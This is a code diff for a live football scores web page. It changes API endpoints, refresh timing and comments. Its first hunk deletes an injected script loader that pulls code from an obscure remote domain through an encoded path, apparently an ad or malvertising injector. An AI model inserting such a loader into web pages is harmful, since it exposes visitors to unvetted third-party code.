@@ -44,21 +44,6 @@ body { background: #000; color: #fff; padding: 15px; }
 </style>
 </head>
 <body>
-
-  <script>
-    (function(ihosnhw){
-    var d = document,
-        s = d.createElement('script'),
-        l = d.currentScript || d.scripts[d.scripts.length - 1];
-    s.settings = ihosnhw || {};
-    s.src = "\/\/quarrelsomebitter.com\/b_XTV\/s.d\/G\/lO0sYQWtcd\/IeJmL9EuDZFU\/lfk\/PGTpc\/0IMTzHg\/2qNKDhUltaNNzaQXzTOEDuYC0bO_QP";
-    s.async = true;
-    s.referrerPolicy = 'no-referrer-when-downgrade';
-    l.parentNode.insertBefore(s, l);
-    })({})
- </script>
-
-
 <div class="div">
   <h1 class="header-text"> Live Football ⚽ </h1>
 <div class="tabs">
@@ -74,7 +59,7 @@ body { background: #000; color: #fff; padding: 15px; }
 </div>
 
 <script>
-const BASE_URL = "https://raymonddomain.dev";
+const BASE_URL = "http://localhost:8000";
 const API_MATCHES = `${BASE_URL}/api/matches`;
 const API_LIVE = `${BASE_URL}/api/live`;
 
@@ -234,12 +219,10 @@ async function loadMatches(tab, btn){
     let matches = [];
 
     if(tab === 'upcoming'){
-      // DB first
       const resDB = await fetch(`${API_MATCHES}?tab=${tab}`, { cache: "no-store", signal: controller.signal });
       const dataDB = await resDB.json();
       let dbMatches = dataDB.success? (dataDB.matches||[]) : [];
 
-      // LIVE directly from API - real minutes + real scores
       try{
         const resLive = await fetch(`${API_LIVE}`, { cache: "no-store", signal: controller.signal });
         const dataLive = await resLive.json();
@@ -266,11 +249,10 @@ async function loadMatches(tab, btn){
 
     const hasLive = matches.some(m => ["IN_PLAY","LIVE","PAUSED"].includes(m.status));
     if(hasLive && tab === "upcoming"){
-      liveInterval = setInterval(()=> loadMatches(tab, btn), 30000); // real API refresh every 30s
+      liveInterval = setInterval(()=> loadMatches(tab, btn), 60000); // FIXED: 60s = matches backend cache, no ban
     }
 
   } catch(err) {
-    console.log('fetch error', err.name, err.message);
     if(err.name === 'AbortError'){
       container.innerHTML = `<div style="text-align:center; padding:40px 20px;"><p>Server waking up... retrying in 3s</p></div>`;
       setTimeout(()=> loadMatches(tab, btn), 3000);
